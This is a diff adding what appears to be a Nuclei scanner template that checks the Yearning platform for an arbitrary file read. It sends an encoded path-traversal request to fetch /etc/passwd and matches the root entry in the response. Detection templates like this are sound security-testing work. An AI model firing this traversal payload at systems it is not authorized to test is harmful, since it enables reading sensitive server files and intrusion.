@@ -1,0 +1,23 @@
+id: yearning-front-fileread
+
+info:
+  name: Yearning front 任意文件读取
+  author: SleepingBag945
+  severity: high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/front/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd"
+
+    host-redirects: true
+    max-redirects: 2
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+
+      - type: status
+        status:
+          - 200
